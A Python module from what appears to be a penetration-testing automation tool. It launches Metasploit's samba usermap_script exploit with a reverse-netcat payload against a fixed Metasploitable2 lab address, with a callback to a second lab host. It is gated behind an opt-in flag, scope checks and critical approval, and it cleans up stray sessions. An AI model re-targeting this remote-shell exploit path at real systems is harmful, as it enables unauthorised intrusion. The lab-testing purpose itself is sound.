"""Opt-in, fixed-target Metasploit access path for the repository lab only."""
from __future__ import annotations

import asyncio
import ipaddress
import os
import re
import time
import uuid

from .capabilities import (
    CapabilityManifest,
    CapabilityRequirements,
    CapabilityUnavailable,
)
from .workflow import WorkflowTask


class MetasploitableLabAccessProvider:
    """Constrained access provider for the checked-in Metasploitable2 lab.

    It has no caller-controlled module, payload, or options and refuses to
    dispatch unless an operator explicitly enables the lab capability, the
    exact compose target is in scope, and the task carries the normal
    plan-bound approval for a critical-impact capability.
    """

    CAPABILITY = "lab.initial_access.samba_usermap"
    PROVIDER_ID = "whaxon.msf.metasploitable-lab"
    PROVIDER_VERSION = "metasploitable-samba-usermap.1"
    TARGET = "172.28.0.10"
    MODULE = "multi/samba/usermap_script"
    PAYLOAD = "cmd/unix/reverse_netcat"
    CALLBACK = "172.28.0.11"
    CALLBACK_PORT = "4444"
    ENABLE_ENV = "WHAXON_ENABLE_V2_LAB_INITIAL_ACCESS"
    SESSION_WAIT_S = 25.0
    SESSION_POLL_INTERVAL_S = 1.0

    def __init__(self, *, store, registry, scope, msf):
        self.store = store
        self.registry = registry
        self.scope = scope
        self.msf = msf
        self.manifest = CapabilityManifest(
            capability_id=self.CAPABILITY,
            provider_id=self.PROVIDER_ID,
            provider_version=self.PROVIDER_VERSION,
            transports=("msf_rpc_loopback",),
            target_types=("ip",),
            permissions=("network.exploit",),
            side_effects=("remote_shell", "target_service_logs"),
            impact="critical",
            readiness="registered",
            timeout_s=90.0,
            input_schema={
                "type": "object", "properties": {}, "additionalProperties": False,
            },
            output_schema={"type": "object", "required": ["job_id", "session_id"]},
            limitations=(
                "Repository controlled lab only: exact target 172.28.0.10.",
                "Fixed exploit/multi/samba/usermap_script module and fixed reverse callback 172.28.0.11:4444.",
                "No caller-supplied module, payload, or Metasploit options.",
                "Requires explicit WHAXON_ENABLE_V2_LAB_INITIAL_ACCESS=1, scope, and plan-bound critical approval.",
                "Does not run legacy Metasploit auto-chain or execute commands in the opened session.",
                "Leaves the verified session open; operator must close it through Metasploit after lab follow-up.",
            ),
        )
        registry.register(self.manifest)

    def bindings(self):
        return (self.manifest,)

    def _authorize_target(self, target: str) -> None:
        rpc_host = str(getattr(getattr(self.msf, "config", None), "host", "127.0.0.1"))
        if rpc_host.strip("[]").lower().rstrip(".") not in {"localhost", "127.0.0.1", "::1"}:
            try:
                if not ipaddress.ip_address(rpc_host.strip("[]")).is_loopback:
                    raise ValueError("lab Metasploit RPC must bind to loopback")
            except ValueError as exc:
                if str(exc) == "lab Metasploit RPC must bind to loopback":
                    raise
                raise ValueError("lab Metasploit RPC must bind to loopback") from None
        if os.environ.get(self.ENABLE_ENV) != "1":
            raise CapabilityUnavailable(self.CAPABILITY, ("lab initial-access opt-in is disabled",))
        try:
            parsed = ipaddress.ip_address(target)
        except ValueError:
            raise ValueError("lab initial-access target must be an IP literal") from None
        if parsed.version != 4 or parsed.compressed != self.TARGET:
            raise ValueError(f"lab initial-access is fixed to {self.TARGET}")
        self.scope.load()
        decision = self.scope.check_for_execution(self.TARGET)
        if not decision.allowed:
            raise ValueError(f"Metasploitable lab target is out of scope: {decision.reason}")

    def resolve_task(self, task: WorkflowTask, *, require_installed: bool = False):
        if not isinstance(task, WorkflowTask):
            raise TypeError("lab access task must be a WorkflowTask")
        if task.capability_id != self.CAPABILITY:
            raise CapabilityUnavailable(task.capability_id, ("unsupported lab access operation",))
        if task.inputs:
            raise ValueError("lab access accepts no dynamic inputs")
        self._authorize_target(task.target)
        current = next((item for item in self.registry.list(self.CAPABILITY)
                        if item.provider_id == self.PROVIDER_ID
                        and item.provider_version == self.PROVIDER_VERSION), None)
        if current is None or current.fingerprint != self.manifest.fingerprint:
            raise CapabilityUnavailable(self.CAPABILITY, ("lab access manifest binding changed",))
        return self.registry.resolve(
            self.CAPABILITY,
            CapabilityRequirements(
                transport="msf_rpc_loopback", target_type="ip",
                required_permissions=tuple(task.permissions),
                maximum_impact=task.impact,
                allowed_providers=(self.PROVIDER_ID,),
                allowed_versions=(self.PROVIDER_VERSION,),
                allowed_fingerprints=(self.manifest.fingerprint,),
                allowed_side_effects=self.manifest.side_effects,
            ),
        )

    @staticmethod
    def _host(value):
        value = str(value or "").strip()
        if value.count(":") == 1:
            host, port = value.rsplit(":", 1)
            if port.isdigit():
                return host
        return value.strip("[]")

    async def _session_snapshot(self) -> dict[str, dict]:
        sessions = await asyncio.to_thread(self.msf.sessions, strict=True)
        if not isinstance(sessions, dict):
            raise RuntimeError("Metasploit returned an invalid session snapshot")
        return {str(key): value for key, value in sessions.items()}

    async def _stop_session(self, session_id: str) -> None:
        reply = await asyncio.to_thread(
            self.msf.connect().call, "session.stop", [str(session_id)],
        )
        if not isinstance(reply, dict) or reply.get("result") != "success":
            raise RuntimeError("Metasploit did not confirm session.stop")
        if str(session_id) in await self._session_snapshot():
            raise RuntimeError("Metasploit session remained open after session.stop")

    async def _cleanup_remote_resources(
        self, remote_job_id: str | None, before_sessions: dict[str, dict], evidence_job_id: str,
        *, known_session_ids=(),
    ) -> list[str]:
        """Stop a failed exploit handler and any new matching late sessions."""
        errors = []
        if remote_job_id is not None:
            try:
                client = self.msf.connect()
                reply = await asyncio.to_thread(client.call, "job.stop", [str(remote_job_id)])
                if not isinstance(reply, dict) or reply.get("result") != "success":
                    running = await asyncio.to_thread(client.call, "job.list", [])
                    if not isinstance(running, dict) or str(remote_job_id) in running:
                        errors.append("job.stop was not confirmed")
            except Exception as exc:
                errors.append(f"job.stop failed: {type(exc).__name__}")

        stopped = set()
        candidates = {str(sid) for sid in known_session_ids}
        try:
            sessions = await self._session_snapshot()
            for sid, info in sessions.items():
                if sid in before_sessions:
                    continue
                via = str(info.get("via_exploit") or "").removeprefix("exploit/")
                host = self._host(info.get("target_host") or info.get("tunnel_peer"))
                if via == self.MODULE and host == self.TARGET:
                    candidates.add(str(sid))
        except Exception as exc:
            errors.append(f"late-session snapshot failed: {type(exc).__name__}")

        for session_id in candidates:
            try:
                await self._stop_session(session_id)
                stopped.add(session_id)
            except Exception as exc:
                errors.append(f"session {session_id} cleanup failed: {type(exc).__name__}")

        try:
            summary = (
                f"Metasploit failure cleanup job={remote_job_id or 'unknown'} "
                f"stopped_sessions={','.join(sorted(stopped)) or 'none'} "
                f"errors={','.join(errors) or 'none'}"
            )
            self.store.append_line(
                evidence_job_id, "stderr", summary,
            )
        except Exception:
            # Caller records cleanup outcome on its already-started evidence job.
            pass
        return errors

    def _safe_diagnostic(self, value: object) -> str:
        """Keep bounded RPC diagnostics useful without retaining credentials."""
        text = str(value or "")
        password = str(getattr(getattr(self.msf, "config", None), "password", "") or "")
        if password:
            text = text.replace(password, "[REDACTED]")
        return re.sub(r"[\x00-\x1f\x7f]+", " ", text).strip()[:2000]

    def _fail_evidence_job(self, job_id: str, message: str) -> None:
        try:
            self.store.append_line(job_id, "stderr", message[:500])
            self.store.set_failed(job_id, message[:500])
        except Exception:
            # The original dispatch/storage failure remains authoritative.
            pass

    async def dispatch(self, task: WorkflowTask) -> dict:
        resolution = self.resolve_task(task, require_installed=True)
        expected = resolution.manifest
        if task.impact != expected.impact or set(task.permissions) != set(expected.permissions):
            raise CapabilityUnavailable(self.CAPABILITY, ("task permission/impact differs from lab contract",))
        # Re-read the scope immediately before the only network dispatch.
        self._authorize_target(task.target)
        job_id = uuid.uuid4().hex[:12]
        self.store.create(job_id)
        if not self.store.set_started(job_id, self.CAPABILITY, self.TARGET):
            raise RuntimeError("could not start lab access evidence job")
        self.store.mark_engine_v2_execution_job(job_id)
        remote_job_id = None
        before_sessions = {}
        try:
            before_sessions = await self._session_snapshot()
            result = await asyncio.to_thread(
                self.msf.execute_rpc,
                "exploit", self.MODULE,
                {"RHOSTS": self.TARGET, "RPORT": "139", "LHOST": self.CALLBACK,
                 "LPORT": self.CALLBACK_PORT},
                payload=self.PAYLOAD, timeout_s=60.0,
            )
            job_value = result.get("job_id") if isinstance(result, dict) else None
            if job_value is None or not str(job_value).strip():
                detail = self._safe_diagnostic(result)
                message = "fixed Metasploit lab exploit did not start"
                raise RuntimeError(f"{message}: {detail}" if detail else message)
            remote_job_id = str(result["job_id"])
            self.store.append_line(
                job_id, "stdout", f"Metasploit remote job started: {remote_job_id}",
            )
        except Exception as exc:
            cleanup_errors = await self._cleanup_remote_resources(
                remote_job_id, before_sessions, job_id,
            )
            detail = self._safe_diagnostic(exc)
            self._fail_evidence_job(
                job_id,
                f"Metasploit dispatch failed: {type(exc).__name__}: {detail}; "
                f"cleanup_errors={','.join(cleanup_errors) or 'none'}",
            )
            raise

        session_id = None
        session_info = None
        deadline = time.monotonic() + self.SESSION_WAIT_S
        try:
            while time.monotonic() < deadline:
                sessions = await self._session_snapshot()
                for sid, info in sessions.items():
                    if str(sid) in before_sessions:
                        continue
                    via = str(info.get("via_exploit") or "").removeprefix("exploit/")
                    host = self._host(info.get("target_host") or info.get("tunnel_peer"))
                    if via == self.MODULE and host == self.TARGET:
                        session_id, session_info = str(sid), info
                        break
                if session_id:
                    break
                await asyncio.sleep(self.SESSION_POLL_INTERVAL_S)
        except Exception as exc:
            await self._cleanup_remote_resources(
                remote_job_id, before_sessions, job_id,
            )
            self._fail_evidence_job(
                job_id,
                f"Metasploit session poll failed for remote job {remote_job_id}: {type(exc).__name__}",
            )
            raise
        if not session_id:
            cleanup_errors = await self._cleanup_remote_resources(
                remote_job_id, before_sessions, job_id,
            )
            self._fail_evidence_job(
                job_id,
                f"Metasploit job {remote_job_id} opened no new matching target session; "
                f"cleanup_errors={','.join(cleanup_errors) or 'none'}",
            )
            raise RuntimeError("fixed lab exploit started but no new matching target session opened")

        session_type = str((session_info or {}).get("type") or "shell")
        try:
            # Keep provenance between the sealed V2 evidence, remote job and
            # live session. Normal success leaves it for operator follow-up.
            self.store.upsert_session(session_id, self.TARGET, session_type, {
                "provider_id": self.PROVIDER_ID,
                "capability_id": self.CAPABILITY,
                "evidence_job_id": job_id,
                "msf_job_id": remote_job_id,
                "module": self.MODULE,
                "retention": "open_until_operator_closes_in_metasploit",
            })
            from .findings import Finding
            finding = Finding(
                kind="msf_session", severity="critical", source="engine-v2-lab-access",
                data={
                    "session_id": session_id, "host": self.TARGET,
                    "session_type": session_type, "msf_job_id": remote_job_id,
                    "module": self.MODULE,
                    "session_retention": "open_until_operator_closes_in_metasploit",
                },
                raw_line=f"fixed repository-lab access established on {self.TARGET}",
                impact="A shell session was established on the explicitly enabled controlled lab target.",
                cwe="CWE-284",
            )
            self.store.append_line(job_id, "stdout", finding.raw_line)
            self.store.append_finding(job_id, finding, 0)
            self.store.set_finished(job_id, 0, 0.0)
        except Exception as exc:
            cleanup_errors = await self._cleanup_remote_resources(
                remote_job_id, before_sessions, job_id,
                known_session_ids=(session_id,),
            )
            self._fail_evidence_job(
                job_id,
                f"evidence persistence failed: {type(exc).__name__}; "
                f"cleanup_errors={','.join(cleanup_errors) or 'none'}",
            )
            if cleanup_errors:
                raise RuntimeError(
                    "could not persist access evidence or confirm Metasploit resource cleanup"
                ) from exc
            raise
        return {
            "job_id": job_id, "session_id": session_id,
            "tool_id": self.CAPABILITY, "target": self.TARGET,
            "exit_code": 0, "provider_id": expected.provider_id,
            "provider_version": expected.provider_version,
            "manifest_fingerprint": expected.fingerprint,
            "registry_digest": resolution.registry_digest,
            "transport": "msf_rpc_loopback",
        }

    def inventory(self):
        return [{
            "capability_id": self.manifest.capability_id,
            "provider_id": self.manifest.provider_id,
            "provider_version": self.manifest.provider_version,
            "manifest_fingerprint": self.manifest.fingerprint,
            "transport": "msf_rpc_loopback",
            "target_types": list(self.manifest.target_types),
            "registry_digest": self.registry.digest,
            "registered": True, "installed": True, "executable": True,
            "readiness": "registered",
            "reason": "fixed_repository_lab_only_requires_opt_in_scope_and_critical_approval",
            "authorization_required": True,
            "smoke_tested": False, "lab_validated": False,
            "end_to_end_verified": False,
        }]
